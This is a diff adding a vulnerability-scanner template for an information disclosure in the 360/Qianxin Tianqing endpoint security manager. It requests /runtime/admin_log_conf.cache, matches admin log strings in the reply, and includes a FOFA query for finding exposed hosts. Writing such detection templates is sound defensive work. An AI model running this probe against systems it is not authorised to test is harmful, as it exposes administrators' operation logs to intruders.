@@ -1,0 +1,30 @@
+id: qianxin-tianqing-admin_log_conf-disclosure
+
+info:
+  name: 360 奇安信新天擎终端安全管理系统 admin_log_conf.cache - disclosure
+  author: leadlife
+  severity: high
+  metadata:
+    verified: true
+    fofa-query: app="360天擎终端安全管理系统"
+  tags: 360,qianxin,disclosure,tianqing
+
+http:
+  - raw:
+      - |
+        GET /runtime/admin_log_conf.cache HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "TYPE_LOGIN"
+          - "SafeCtrlAdminOpLogLogic"
+          - "AuditAdminOpLogLogic"
+        condition: or
+
+      - type: status
+        status:
+          - 200
